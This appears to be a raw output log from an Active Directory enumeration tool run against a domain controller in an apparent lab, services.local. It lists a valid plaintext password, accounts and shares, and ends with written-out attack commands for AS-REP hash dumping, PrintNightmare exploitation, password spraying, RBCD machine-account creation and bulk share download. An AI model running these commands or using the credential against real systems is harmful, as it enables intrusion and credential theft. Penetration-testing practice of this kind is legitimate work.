@@ -1,0 +1,710 @@
+NXC-ENUM - NetExec Enumeration Wrapper (v1.7.0)
+
+Warning: Credential file '/root/machines/ServicesV4/10.64.148.123/usernames' has loose permissions
+  Current permissions: 644
+  Recommended: chmod 600 /root/machines/ServicesV4/10.64.148.123/usernames
+
+[*] Checking SMB reachability...
+[+] Target hostname 'WIN-SERVICES.services.local' resolves correctly
+
+ ===================================================
+|    Anonymous Session Probe for 10.64.191.197    |
+ ===================================================
+[*] Probing SMB null session...
+[+] SMB null session available!
+[*] Probing SMB guest session...
+[*] SMB guest session: Guest account is disabled
+[*] Probing LDAP anonymous bind...
+[*] LDAP anonymous bind works but search requires authentication
+
+[!] Anonymous access: SMB null, LDAP anonymous
+
+[*] Note: Anonymous access detected but using provided credentials
+
+ =================================================
+|    Credential Validation for 10.64.191.197    |
+ =================================================
+[*] Testing 4 credential(s)...
+[-] services.local\j.larusso: invalid (STATUS_LOGON_FAILURE)
+[-] services.local\w.masters: invalid (STATUS_LOGON_FAILURE)
+[-] services.local\j.doe: invalid (STATUS_LOGON_FAILURE)
+[+] services.local\j.rock: valid
+
+[+] 1/4 credentials validated successfully
+[!] Note: No admin credentials found - some modules may be limited
+
+ ============================
+|    Target Information    |
+ ============================
+[*] Target ........... 10.64.191.197
+[*] Password ......... 'Serviceworks1'
+[*] Domain ........... 'services.local'
+[*] Timeout .......... 30 second(s)
+
+ =========================================
+|    Listener Scan for 10.64.191.197    |
+ =========================================
+[*] Checking LDAP
+[+] LDAP is accessible on 389/tcp
+[*] Checking LDAPS
+[+] LDAPS is accessible on 636/tcp
+[*] Checking SMB
+[+] SMB is accessible on 445/tcp
+[*] Checking SMB over NetBIOS
+[+] SMB over NetBIOS is accessible on 139/tcp
+[*] Pre-scanning service ports...
+[+] Services available: winrm, rdp
+[*] Services unavailable: winrms, mssql, ftp, nfs, ssh, vnc
+[*] Priming caches in parallel...
+
+ ===============================================
+|    Domain Intelligence for 10.64.191.197    |
+ ===============================================
+[*] Gathering from LDAP...
+[*] Gathering from SMB...
+[*] Gathering from RPC...
+
+[+] Target is a Domain Controller
+  Hostname:        WIN-SERVICES
+  FQDN:            WIN-SERVICES.services.local
+  NetBIOS Domain:  SERVICES
+  DNS Domain:      services.local
+  Domain SID:      S-1-5-21-1966530601-3185510712-10604624
+
+ =============================================
+|    SMB Dialect Check for 10.64.191.197    |
+ =============================================
+[*] Trying on 445/tcp
+[+] SMB dialect information:
+  SMBv1: Disabled
+  Signing: required (secure)
+
+ =============================================
+|    RPC Session Check for 10.64.191.197    |
+ =============================================
+[*] Check for anonymous access (null session)
+[+] Server allows authentication via username '' and password ''
+[*] Check for guest access
+[*] Guest account is disabled
+
+SESSION DETAILS:
+  Signing: required
+
+ ==================================================
+|    OS Information via RPC for 10.64.191.197    |
+ ==================================================
+[*] Enumerating via SMB session on 445/tcp
+[+] Found OS information via SMB
+  OS: Windows 10 / Server 2019 Build 17763 x64
+  OS version: '2019'
+  Architecture: x64
+  OS build: '17763'
+
+  Outdated Windows 10 build - security updates may be limited
+
+ =========================================
+|    Users via RPC for 10.64.191.197    |
+ =========================================
+[*] Enumerating users via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 8 user(s) total
+
+Built-in Accounts (3)
+RID     Username                Description
+------  ----------------------  ----------------------------------------
+500     Administrator           Built-in account for administering th...
+501     Guest                   account for guest access to the compu...
+502     krbtgt                  Key Distribution Center Service Account
+
+Computer Accounts (1)
+RID     Username                Description
+------  ----------------------  ----------------------------------------
+1008    WIN-SERVICES$           
+
+Standard Users (4)
+RID     Username                Description
+------  ----------------------  ----------------------------------------
+1111    j.rock                  IT Support
+1112    j.doe                   
+1113    w.masters               
+1114    j.larusso               
+
+ ==========================================
+|    Groups via RPC for 10.64.191.197    |
+ ==========================================
+[*] Enumerating domain groups
+[*] Enumerating builtin groups
+[+] Found 20 group(s) total (13 domain, 3 builtin, 4 local)
+[*] Enumerating high-value group members...
+
+HIGH-VALUE GROUPS (7)
+======================================================================
+Group                            Members
+-------------------------------- --------------------------------------
+Domain Admins                    Administrator
+Schema Admins                    Administrator
+Enterprise Admins                Administrator
+Group Policy Creator Owners      Administrator
+
+Empty (no members): Key Admins, Enterprise Key Admins, DnsAdmins
+
+OTHER GROUPS (13)
+----------------------------------------------------------------------
+  Domain: Domain Users, Domain Guests, Domain Computers (+4 more)
+  Builtin: RAS and IAS Servers (+2 more)
+  Local: Enterprise Read-only Domain Controllers (+2 more)
+
+ ==========================================
+|    Shares via RPC for 10.64.191.197    |
+ ==========================================
+[*] Enumerating shares
+[+] Found 5 share(s)
+
+ACCESSIBLE SHARES (5)
+Share           Access       Comment
+--------------- ------------ ------------------------------
+ADMIN$          READ         Remote Admin
+C$              READ,WRITE   Default share
+IPC$            READ         Remote IPC
+NETLOGON        READ         Logon server share
+SYSVOL          READ         Logon server share
+
+============================================================
+  POTENTIAL ELEVATED PRIVILEGES DETECTED
+  C$ is writable - likely local admin!
+  NetExec didn't show Pwn3d! - verify manually with:
+    nxc smb 10.64.191.197 <auth> --local-auth
+============================================================
+
+
+ ============================================
+|    Policies via RPC for 10.64.191.197    |
+ ============================================
+[*] Trying port 445/tcp
+[+] Found policy:
+Domain password information:
+  Password history length: 24
+  Minimum password length: 7 ← Weak!
+  Minimum password age: 1 day 4 minutes
+  Maximum password age: 41 days 23 hours 53 minutes
+  Password properties:
+  - DOMAIN_PASSWORD_COMPLEX: 000001
+Domain lockout information:
+  Lockout observation window: 10 minutes
+  Lockout duration: 10 minutes
+  Lockout threshold: None
+
+Extended Policy Information (from verbose output):
+  Reversible Encryption: Disabled
+
+ ===========================================
+|    Active Sessions for 10.64.191.197    |
+ ===========================================
+[*] Skipping: requires local admin (current user is not admin)
+
+ ===========================================
+|    Logged On Users for 10.64.191.197    |
+ ===========================================
+[*] Skipping: requires local admin (current user is not admin)
+
+ ============================================
+|    Printers via RPC for 10.64.191.197    |
+ ============================================
+[!] Print spooler running - potential PrintNightmare (CVE-2021-34527) target!
+
+ ============================================
+|    AV/EDR Detection for 10.64.191.197    |
+ ============================================
+[*] Skipping: requires local admin (current user is not admin)
+
+ ===================================================
+|    Kerberoastable Accounts for 10.64.191.197    |
+ ===================================================
+[*] Querying accounts with SPNs...
+[+] No Kerberoastable accounts found
+  (Filtered: 1 DC account(s), krbtgt)
+
+ ==================================================
+|    Delegation Enumeration for 10.64.191.197    |
+ ==================================================
+[*] Querying delegation configurations...
+[+] No delegation configurations found
+
+ =================================================
+|    Password Not Required for 10.64.191.197    |
+ =================================================
+[*] Using cached batch data for PASSWD_NOTREQD accounts...
+[!] Found 2 account(s) with PASSWD_NOTREQD flag:
+
+  Enabled Accounts (HIGH RISK):
+    j.rock
+
+  Disabled Accounts:
+    Guest (disabled)
+
+
+ =================================================
+|    Machine Account Quota for 10.64.191.197    |
+ =================================================
+[*] Querying machine account quota...
+[!] Machine Account Quota: 10 - RBCD attacks possible!
+
+ ======================================================
+|    Pre-Windows 2000 Computers for 10.64.191.197    |
+ ======================================================
+[*] Checking for pre-Windows 2000 compatible computers...
+[*] No pre-Windows 2000 compatible computers found
+
+ =================================================
+|    LAPS Deployment Check for 10.64.191.197    |
+ =================================================
+[*] Checking for LAPS deployment...
+[*] No LAPS deployment detected in domain
+
+ ==============================================
+|    LDAP Signing Check for 10.64.191.197    |
+ ==============================================
+[*] Checking LDAP signing requirements...
+
+LDAP SECURITY CONFIGURATION
+--------------------------------------------------
+  [!] LDAP Signing: UNKNOWN
+      Could not determine signing requirements
+
+
+[*] Could not determine LDAP signing status
+
+ ====================================================
+|    gMSA Account Enumeration for 10.64.191.197    |
+ ====================================================
+[*] Querying for gMSA accounts...
+[*] No gMSA accounts found in domain
+
+ ================================================================
+|    Fine-Grained Password Policies (PSO) for 10.64.191.197    |
+ ================================================================
+[*] Querying for Password Settings Objects...
+[*] No Fine-Grained Password Policies found
+
+ ===============================================
+|    SCCM/MECM Discovery for 10.64.191.197    |
+ ===============================================
+[*] Searching for SCCM/MECM infrastructure...
+[*] No SCCM/MECM infrastructure detected
+
+ =============================================
+|    User Descriptions for 10.64.191.197    |
+ =============================================
+[*] Querying user descriptions...
+[*] Found 4 user description(s):
+
+  Administrator: Built-in account for administering the computer/domain
+  Guest: Built-in account for guest access to the computer/domain
+  krbtgt: Key Distribution Center Service Account
+  j.rock: IT Support
+
+ ===========================================
+|    DNS Enumeration for 10.64.191.197    |
+ ===========================================
+[*] Checking DNS enumeration options...
+
+DNS ENUMERATION OPTIONS
+------------------------------------------------------------
+
+[+] LDAP available - DNS zone transfer via LDAP possible
+
+RECOMMENDED COMMANDS:
+------------------------------------------------------------
+
+[*] Dump all DNS records via LDAP (adidnsdump):
+    adidnsdump -u 'services.local\\j.rock' -p 'Serviceworks1' --dns-tcp 10.64.191.197
+      # Or: --hashes ':NTLM', -k (Kerberos)
+
+[*] Dump specific zone:
+    adidnsdump -u 'services.local\\j.rock' -p 'Serviceworks1' --dns-tcp -z services.local 10.64.191.197
+
+[*] Include tombstoned (deleted) records:
+    adidnsdump -u 'services.local\\j.rock' -p 'Serviceworks1' --dns-tcp --include-tombstoned 10.64.191.197
+
+[*] Query specific record (dnstool.py):
+    dnstool.py 'services.local/j.rock:Serviceworks1' 10.64.191.197 -r '<record>'
+
+ALTERNATIVE (uses WMI - executes on target):
+------------------------------------------------------------
+
+[*] NetExec enum_dns module (requires admin, uses WMI):
+    nxc smb 10.64.191.197 -u 'j.rock' -p 'Serviceworks1' -d 'services.local' -M enum_dns
+      # Or: -H 'NTLM', --use-kcache, --aesKey
+
+
+ ==================================================
+|    WebDAV/WebClient Check for 10.64.191.197    |
+ ==================================================
+[*] Checking WebClient service status...
+[*] WebClient service is not running (no response)
+
+ ========================================
+|    Local Groups for 10.64.191.197    |
+ ========================================
+[*] Skipping: requires local admin (current user is not admin)
+
+ ====================================================
+|    GPP Password Enumeration for 10.64.191.197    |
+ ====================================================
+[*] Searching SYSVOL for GPP passwords (MS14-025)...
+[*] No GPP passwords found in SYSVOL
+    Searched SYSVOL for GPP XML files - none contain cpassword
+
+ =========================================================
+|    Network Interface Enumeration for 10.64.191.197    |
+ =========================================================
+[*] Enumerating network interfaces...
+[*] No additional network interfaces found
+
+ ============================================
+|    Disk Enumeration for 10.64.191.197    |
+ ============================================
+[*] Skipping: requires local admin (current user is not admin)
+
+ ===========================================
+|    MSSQL Detection for 10.64.191.197    |
+ ===========================================
+[*] MSSQL port (1433) not open - skipping
+
+ ============================================
+|    RDP Status Check for 10.64.191.197    |
+ ============================================
+[*] Checking RDP configuration...
+
+RDP CONFIGURATION
+--------------------------------------------------
+  [+] RDP: Enabled
+  [*] Hostname: WIN-SERVICES
+  [+] NLA: Required
+      Network Level Authentication protects against some attacks
+
+[+] RDP is enabled on target
+
+ ===========================================
+|    FTP Enumeration for 10.64.191.197    |
+ ===========================================
+[*] FTP port (21) not open - skipping
+
+ =================================================
+|    NFS Share Enumeration for 10.64.191.197    |
+ =================================================
+[*] NFS port (2049) not open - skipping
+
+ =================================================
+|    VNC Service Detection for 10.64.191.197    |
+ =================================================
+[*] VNC ports not open - skipping
+
+ ===========================================================
+|    iOXIDResolver Network Discovery for 10.64.191.197    |
+ ===========================================================
+[*] Querying DCOM iOXIDResolver for network bindings...
+[*] No additional network bindings discovered
+
+ ============================================
+|    Domain Computers for 10.64.191.197    |
+ ============================================
+[*] Querying domain computers...
+[+] Found 1 computer(s)
+
+OPERATING SYSTEM SUMMARY
+Operating System                Count
+------------------------------ ------
+Windows Server 2019                 1
+
+SERVERS (1)
+Computer Name             Operating System
+------------------------- ----------------------------------------
+WIN-SERVICES              Windows Server 2019 Datacenter 10.0 (...
+
+ =====================================================
+|    AS-REP Roastable Accounts for 10.64.191.197    |
+ =====================================================
+[*] Querying accounts without Kerberos pre-authentication...
+[!] Found 1 account(s) vulnerable to AS-REP roasting:
+[*] DONT_REQUIRE_PREAUTH bypasses Kerberos pre-authentication. Attackers can request AS-REP tickets WITHOUT credentials and crack them offline.
+
+============================================================
+  VULNERABLE ACCOUNTS (DONT_REQUIRE_PREAUTH)
+  These accounts return crackable hashes WITHOUT a password!
+============================================================
+
+  >>> j.rock <<<
+
+
+ ============================================
+|    ADCS Enumeration for 10.64.191.197    |
+ ============================================
+[*] Querying ADCS certificate templates...
+[*] No ADCS infrastructure found
+
+ =======================================================
+|    Domain Controllers & Trusts for 10.64.191.197    |
+ =======================================================
+[*] Querying domain controllers and trusts...
+[*] Found 1 Domain Controller(s):
+  WIN-SERVICES.services.local (10.64.191.197)
+[*] No trust relationships found
+
+ ===============================================
+|    AdminCount Accounts for 10.64.191.197    |
+ ===============================================
+[*] Using cached batch data for adminCount accounts...
+[!] Found 3 account(s) with adminCount=1:
+
+    Administrator
+    krbtgt
+    j.rock
+
+[*] adminCount=1 indicates accounts protected by SDProp (Security Descriptor Propagation). These have or had Domain Admin-level privileges. Stale accounts may have outdated ACLs.
+
+ =============================================
+|    SMB Signing Check for 10.64.191.197    |
+ =============================================
+[*] Checking SMB signing requirements...
+[+] SMB signing is REQUIRED - relay attacks blocked
+
+SMB Signing Details:
+  SMBv1: disabled
+
+ ================================================
+|    AD Sites and Subnets for 10.64.191.197    |
+ ================================================
+[*] Enumerating AD sites and subnets...
+[-] AD subnet enumeration failed (module error)
+
+ALTERNATIVE: Query AD subnets directly with ldapsearch:
+    ldapsearch -H ldap://10.64.191.197 -D '<user>@<domain>' -w '<pass>' \
+      -b 'CN=Subnets,CN=Sites,CN=Configuration,DC=services,DC=local' '(objectClass=subnet)' cn siteObject
+
+
+ ============================================
+|    BitLocker Status for 10.64.191.197    |
+ ============================================
+[*] Skipping: requires local admin (current user is not admin)
+
+ =========================================
+|    Shares Matrix for 10.64.191.197    |
+ =========================================
+[*] Enumerating shares for 1 user(s)...
+
+Share       services.local\j.rock
+---------------------------------
+ADMIN$      READ                 
+C$          READ,WRITE           
+IPC$        READ                 
+NETLOGON    READ                 
+SYSVOL      READ                 
+
+Legend: WRITE | READ | - = No Access
+
+ ===========================================
+|    Active Sessions for 10.64.191.197    |
+ ===========================================
+[*] Skipping: requires local admin (no admin credentials available)
+
+ ===========================================
+|    Logged On Users for 10.64.191.197    |
+ ===========================================
+[*] Skipping: requires local admin (no admin credentials available)
+
+ ====================================
+|    Printers for 10.64.191.197    |
+ ====================================
+[*] Checking print spooler for 1 user(s)...
+
+[!] services.local\j.rock: Spooler RUNNING
+
+[!] Print spooler running - check for PrintNightmare!
+
+ ============================================
+|    AV/EDR Detection for 10.64.191.197    |
+ ============================================
+[*] Skipping: requires local admin (no admin credentials available)
+
+ =============================================
+|    Executive Summary for 10.64.191.197    |
+ =============================================
+TARGET PROFILE
+--------------------------------------------------
+  Target:      10.64.191.197 (WIN-SERVICES.services.local)
+  Role:        Domain Controller
+  Domain:      services.local
+  Domain SID:  S-1-5-21-1966530601-3185510712-10604624
+
+CREDENTIALS (1 valid)
+--------------------------------------------------
+  Standard Users (1):
+    - services.local\j.rock
+
+SECURITY POSTURE
+--------------------------------------------------
+[+] SMB Signing: REQUIRED
+[!] Min Password Length: 7 chars (weak)
+[!] Lockout Threshold: NONE - Password spraying safe!
+[!] Print Spooler: RUNNING - Check for PrintNightmare!
+
+SHARE ACCESS SUMMARY
+--------------------------------------------------
+  services.local\j.rock: 5 accessible, 1 writable
+
+KEY FINDINGS
+--------------------------------------------------
+[!] Privileged Users (1): Administrator
+  → Members of high-value groups (Domain Admins, etc.)
+
+POTENTIAL ATTACK VECTORS
+--------------------------------------------------
+[!] Password spraying (no lockout)
+[!] PrintNightmare (spooler running)
+
+ ==================================================
+|    Recommended Next Steps for 10.64.191.197    |
+ ==================================================
+HIGH PRIORITY (3)
+------------------------------------------------------------
+  → PASSWD_NOTREQD accounts: j.rock
+    Try empty password for PASSWD_NOTREQD accounts
+    $ nxc smb 10.64.191.197 -u 'j.rock' -p ''
+
+  → AS-REP roastable accounts: j.rock
+    Request AS-REP tickets and export hashes (hashcat -m 18200)
+    $ nxc ldap 10.64.191.197 -u 'j.rock' -p 'Serviceworks1' -d 'services.local' --asreproast hashes.txt
+
+  → Print spooler service running
+    Check for PrintNightmare (CVE-2021-34527) vulnerability
+    $ nxc smb 10.64.191.197 -u 'j.rock' -p 'Serviceworks1' -d 'services.local' -M printnightmare
+    !!! AUTO-EXPLOIT: PrintNightmare (CVE-2021-34527) - auto-exploits print spooler
+
+MEDIUM PRIORITY (2)
+------------------------------------------------------------
+  → LDAP available for DNS enumeration
+    Dump AD-integrated DNS records via LDAP  # Or: --hashes ':NTLM', -k (Kerberos)
+    $ adidnsdump -u 'services.local\\j.rock' -p 'Serviceworks1' --dns-tcp 10.64.191.197
+
+  → Machine Account Quota is 10
+    Add a machine account for RBCD or other attacks
+    $ addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' 'services.local/j.rock:Serviceworks1'
+
+LOW PRIORITY (2)
+------------------------------------------------------------
+  → Readable shares: ADMIN$, C$, NETLOGON (+1 more)
+    Spider and download files from shares (outputs to OUTPUT_FOLDER)
+    $ nxc smb 10.64.191.197 -u 'j.rock' -p 'Serviceworks1' -d 'services.local' -M spider_plus -o OUTPUT_FOLDER=. MAX_FILE_SIZE=10485760 DOWNLOAD_FLAG=True
+
+  → Readable share: ADMIN$
+    Browse share manually with smbclient
+    $ smbclient //10.64.191.197/ADMIN$ -u 'j.rock' -p 'Serviceworks1'
+
+
+================================================================================
+                                COPY-PASTE LISTS                                
+================================================================================
+
+Targets (Enumerated) (1):
+------------------------------
+10.64.191.197
+
+Usernames (8):
+------------------------------
+administrator
+guest
+j.doe
+j.larusso
+j.rock
+krbtgt
+w.masters
+win-services$
+
+Usernames (DOMAIN\user) (8):
+------------------------------
+services.local\administrator
+services.local\guest
+services.local\j.doe
+services.local\j.larusso
+services.local\j.rock
+services.local\krbtgt
+services.local\w.masters
+services.local\win-services$
+
+Group Names (20):
+------------------------------
+Allowed RODC Password Replication Group
+Cert Publishers
+Cloneable Domain Controllers
+Denied RODC Password Replication Group
+DnsAdmins
+DnsUpdateProxy
+Domain Admins
+Domain Computers
+Domain Controllers
+Domain Guests
+Domain Users
+Enterprise Admins
+Enterprise Key Admins
+Enterprise Read-only Domain Controllers
+Group Policy Creator Owners
+Key Admins
+Protected Users
+RAS and IAS Servers
+Read-only Domain Controllers
+Schema Admins
+
+Share Names (5):
+------------------------------
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+
+Share UNC Paths (5):
+------------------------------
+\\10.64.191.197\ADMIN$
+\\10.64.191.197\C$
+\\10.64.191.197\IPC$
+\\10.64.191.197\NETLOGON
+\\10.64.191.197\SYSVOL
+
+AS-REP Roastable Usernames (1):
+------------------------------
+j.rock
+
+DC Hostnames (1):
+------------------------------
+WIN-SERVICES.services.local
+
+DC IPs (1):
+------------------------------
+10.64.191.197
+
+Computer Names (1):
+------------------------------
+WIN-SERVICES
+
+Server Names (1):
+------------------------------
+WIN-SERVICES
+
+PASSWD_NOTREQD Accounts (2):
+------------------------------
+guest
+j.rock
+
+AdminCount=1 Accounts (3):
+------------------------------
+administrator
+j.rock
+krbtgt
+
+Valid Credentials (user:password) (1):
+------------------------------
+services.local\j.rock:Serviceworks1
+
+
+Completed after 69.68 seconds
